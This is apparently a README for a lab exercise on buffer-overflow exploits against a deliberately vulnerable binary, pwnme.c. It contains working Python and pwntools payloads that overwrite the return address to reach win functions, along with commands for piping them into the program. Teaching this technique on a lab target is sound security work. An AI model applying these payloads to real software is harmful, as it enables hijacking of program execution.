# README for Buffer Overflow Exploit Challenges

## Overview

This repository contains several Python scripts to create payloads for exploiting buffer overflow vulnerabilities in a vulnerable binary called `pwnme.c`. The challenges demonstrate the use of both standard Python and the `pwntools` library to craft and send payloads to the vulnerable application. 

The primary goal is to overwrite the return address of the function `vuln` to redirect the execution flow to either `win1` or `win2`, allowing the attacker to gain a shell access or a predefined victory message.

---

## File Structure

- **`pwnme.c`**: The source code of the vulnerable application, which contains a buffer overflow vulnerability in the `vuln` function.
- **Scripts**:
  - `vanilla_boilerplate.py`
  - `vanilla_demo.py`
  - `vanilla_full.py`
  - `pwntools_boilerplate.py`
  - `pwntools_demo.py`
  - `pwntools_full.py`

---

## Challenge Descriptions

### 1. **Vanilla Python Scripts**

These scripts use standard Python capabilities to generate and send payloads directly to the vulnerable application.

- **`vanilla_boilerplate.py`**: Sends a simple payload to the application without exploiting the buffer overflow.
  
- **`vanilla_demo.py`**: Constructs a payload to call the `win1` function by overwriting the return address after filling the buffer.
  
- **`vanilla_full.py`**: Crafts a more complex payload to target the `win2` function, providing the necessary argument to trigger the victory condition.

#### Example of Vanilla Payload Creation

```python
# Usage: python3 vanilla_demo.py | ./pwnme

import sys

# Create your bytes data
payload = b''
payload += b'A' * 16  # fill the buffer
payload += b'B' * 8   # overwrite some other misc data on the stack
payload += b'C' * 4   # padding for ebp
payload += b'\xf3\x91\x04\x08'  # win1 function address
payload += b'\n'  # ending newline to terminate gets() read

sys.stdout.buffer.write(payload)
```

---

### 2. **Pwntools Scripts**

These scripts leverage the pwntools library, which provides useful functions and methods tailored for exploit development and binary manipulation.

- **`pwntools_boilerplate.py`**: Similar to the vanilla boilerplate, it sends a simple payload without exploiting the vulnerability.

- **`pwntools_demo.py`**: Automatically constructs the payload to call `win1`, utilizing the `pwntools` functionalities for ease of use.

- **`pwntools_full.py`**: Generates a detailed payload that overwrites the return address and provides an argument for `win2`, fully utilizing the pwntools library to handle ELF file parsing and function address retrieval.

#### Example of Pwntools Payload Creation

```python
# Usage: python3 pwntools_demo.py

from pwn import *

e = ELF('./pwnme')
p = process('./pwnme')

payload = b''
payload += b'A' * 16  # fill the buffer
payload += b'B' * 8   # overwrite some other misc data on the stack
payload += b'C' * 4   # padding for ebp
payload += p32(e.functions.win1.address)  # win1 function address

p.sendline(payload) # send the payload
p.interactive() # make the process interactive in the terminal
```

---

## Some differences Between Vanilla Python and Pwntools for supervised lab

| Feature                        | Vanilla Python                       | Pwntools                             |
|--------------------------------|--------------------------------------|--------------------------------------|
| Address Retrieval               | Manual, require hardcoding addresses | Automatic via `ELF` class            |
| Sending Payloads                | Uses `sys.stdout.buffer.write()`    | `p.sendline()` or `p.send()`        |
| Process Handling                | Requires manual process management   | Handles process management and GDB debugging seamlessly |

---

## Conclusion

This repository provides an educational foundation for understanding and working with buffer overflow vulnerabilities in C programs. By contrasting the use of vanilla Python with the capabilities of pwntools, users can appreciate the different levels of complexity and efficiency in exploit development. 

## Usage Instructions

To run the challenges, you can execute the corresponding Python script and pipe its output into the vulnerable binary. Ensure that you have the necessary permissions and environment to execute these scripts securely.

```bash
# Example command for executing the vanilla full exploit
python3 vanilla_full.py | ./pwnme
```

Adjust the commands for pwntools scripts similarly:

```bash
# Example for pwntools full exploit
python3 pwntools_full.py
``` 

Make sure to compile `pwnme.c` using the appropriate flags before running the scripts. 

Good luck and happy hacking!
